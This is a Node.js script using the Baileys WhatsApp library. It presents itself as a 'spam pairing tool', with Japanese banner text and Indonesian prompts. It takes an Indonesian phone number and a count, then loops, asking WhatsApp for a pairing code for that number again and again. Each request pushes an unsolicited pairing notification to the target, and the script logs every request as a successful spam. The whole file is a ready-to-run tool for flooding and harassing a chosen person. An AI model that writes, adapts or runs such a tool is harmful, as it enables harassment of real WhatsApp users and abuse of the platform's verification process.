const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

const color = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m'];
const wColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, (ans) => { rl.close(); resolve(ans); }));
};

function normalizePhoneNumber(input) {
    let num = input.replace(/[^\d]/g, '');
    if (num.startsWith('0')) num = '62' + num.slice(1);
    if (num.startsWith('+62')) num = '62' + num.slice(3);
    return num;
}

const delay = (ms) => new Promise(res => setTimeout(res, ms));

async function loadingSpinner(text, duration = 2000, interval = 100) {
    const frames = ['⠸', '⠴', '⠦', '⠧'];
    let i = 0;
    const start = Date.now();
    while (Date.now() - start < duration) {
        process.stdout.write(`\r${text} ${frames[i % frames.length]} `);
        await delay(interval);
        i++;
    }
    process.stdout.write('\r' + ' '.repeat(50) + '\r');
}

async function connectWhatsApp() {
    let retryCount = 0;
    const maxRetries = 5;
    const retryDelay = 5000;
    
    while (retryCount < maxRetries) {
        try {
            const { state } = await useMultiFileAuthState('./LUCIFER/session');
            const LuciferBot = makeWASocket({
                logger: pino({ level: "silent" }),
                printQRInTerminal: false,
                auth: state,
                connectTimeoutMs: 60000,
                defaultQueryTimeoutMs: 0,
                keepAliveIntervalMs: 10000,
                emitOwnEvents: true,
                fireInitQueries: true,
                generateHighQualityLinkPreview: true,
                syncFullHistory: true,
                markOnlineOnConnect: true,
                browser: ["Ubuntu", "Chrome", "20.0.04"],
            });
            
            LuciferBot.ev.on('connection.update', (update) => {
                const { connection, lastDisconnect } = update;
                if (connection === 'close') {
                    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                    if (shouldReconnect) {
                        console.log(wColor + '\nConnection lost, attempting to reconnect...' + xColor);
                        connectWhatsApp().catch(err => console.error('Reconnection failed:', err));
                    } else {
                        console.log(wColor + '\nDevice logged out, please scan QR again.' + xColor);
                        process.exit(0);
                    }
                } else if (connection === 'open') {
                    console.log(wColor + '\nSuccessfully connected to WhatsApp!' + xColor);
                    retryCount = 0;
                }
            });

            return LuciferBot;
        } catch (error) {
            retryCount++;
            console.error(wColor + `Connection failed (attempt ${retryCount}/${maxRetries}):`, error.message + xColor);
            if (retryCount < maxRetries) {
                await delay(retryDelay);
            }
        }
    }
    throw new Error('Failed to connect after multiple attempts');
}

async function LuciferXSatanic() {
    try {
        let LuciferBot = await connectWhatsApp();
        
        const handleReconnect = async () => {
            console.log(wColor + '\nReconnecting...' + xColor);
            try {
                LuciferBot = await connectWhatsApp();
                return true;
            } catch (error) {
                console.error('Reconnection failed:', error.message);
                return false;
            }
        };

        while (true) {
            console.clear();
            console.log(wColor + `
 • スパムペアリングツール
 • 作成者: Hazel
 • 使用注意
┏❐
┃ [ 以下の指示に従ってください ]
┃
┃⭔ Masukkan Nomor | Jumlah (Contoh: 62xxx | 20)
┃⭔ Ketik "exit" kapan saja untuk keluar
┗❐
` + xColor); // Saya ubah teks bantuan di sini

            try {
                // === MODIFIKASI DIMULAI DI SINI ===

                let userInput = await question(wColor + 'Masukkan Nomor | Jumlah (Contoh: 628123 | 20) : ' + xColor);
                
                if (userInput.toLowerCase() === 'exit') {
                    console.log('Keluar...');
                    process.exit(0);
                }

                const parts = userInput.split('|');
                if (parts.length !== 2) {
                    console.log('❌ Format salah. Harap gunakan format: NOMOR | JUMLAH');
                    await delay(2000);
                    continue; 
                }

                let rawNumber = parts[0].trim(); // Ambil bagian nomor
                let rawCount = parts[1].trim(); // Ambil bagian jumlah

                // === MODIFIKASI SELESAI ===


                // Logika validasi nomor (dari kode asli)
                let phoneNumber = normalizePhoneNumber(rawNumber);
                if (!phoneNumber.startsWith('62')) {
                    console.log('❌ Harap gunakan nomor Indonesia (awalan 62).'); // Ubah teks error
                    await delay(2000);
                    continue;
                }

                // Logika validasi jumlah (dari kode asli)
                const LuciferCodes = parseInt(rawCount);
                if (isNaN(LuciferCodes) || LuciferCodes <= 0) {
                    console.log('❌ Jumlah spam tidak valid. Contoh: 20'); // Ubah teks error
                    await delay(2000);
                    continue;
                }

                // Logika pengiriman spam (dari kode asli, tidak berubah)
                for (let i = 0; i < LuciferCodes; i++) {
                    try {
                        await loadingSpinner(`Sending package to ${phoneNumber}`, 2000, 200);
                        let code = await LuciferBot.requestPairingCode(phoneNumber);
                        code = code?.match(/.{1,4}/g)?.join("-") || code;
                        console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}]` + xColor);
                    } catch (error) {
                        console.error('エラー:', error.message);
                        const reconnected = await handleReconnect();
                        if (!reconnected) break;
                    }
                    await delay(5000);
                }

                console.log('\nSelesai! Menunggu input baru...');
                await delay(3000);

            } catch (error) {
                console.error('エラーが発生しました', error.message);
                const reconnected = await handleReconnect();
                if (!reconnected) break;
                await delay(3000);
            }
        }
    } catch (error) {
        console.error('Fatal error:', error.message);
        process.exit(1);
    }
}

LuciferXSatanic();
